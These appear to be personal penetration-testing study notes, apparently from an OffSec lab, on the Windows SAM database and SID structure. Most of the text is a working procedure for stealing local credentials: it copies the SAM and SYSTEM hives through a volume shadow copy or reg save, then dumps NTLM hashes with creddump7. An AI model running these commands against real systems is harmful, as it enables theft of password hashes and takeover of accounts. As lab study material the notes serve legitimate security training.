SAM Database location: 
```
C:\Windows\System32\config\SAM
```

## SID Structure

### S-R-I-S

- S -> Identifying that it is a SID
- R -> Revision level (often 1)
- I -> Identifier authority value (often 5)
- S -> Sub authority values (could have more). Always ends with a relative identifier that represents an object in the computer

### Get computer name

```powershell
$env:computername
```

### Enumerate SID for local admin

```powershell
[wmi] "Win32_userAccount.Domain='client',Name='Administrators'"
```

### Get credentials from SAM database

```powershell
# Open powershell as admin
# Since SYSTEM has lock on SAM database, we need to bypass it

# Create Shadow Copy fo C:\
wmic shadowcopy call create Volume='C:\'

# Verify snapshots
vssadmin list shadows

# Copy source path of SAM from shadow copy to user dir
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\Users\offsec.corp1\Downloads\sam

# Copy source path of SYSTEM from shadow copy to user dir
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\Users\offsec.corp1\Downloads\system

# Same routine but with the REGISTRY
reg save HKLM\sam C:\Users\offsec.corp1\Downloads\sam

reg save HKLM\system C:\Users\offsec.corp1\Downloads\system

# Using CredDump7 to dump SAM database passwords
# First install python-crypto library
sudo apt install python-crypto

# Install CredDump7
sudo git clone https://github.com/CiscoCXSecurity/creddump7
cd creddump7

~ Copy SYSTEM and SAM files from Windows to Kali (or wherever creddump7 is installed) ~

# Crack NTLM hashes with pwdump.py
python pwdump.py SYSTEM SAM
```
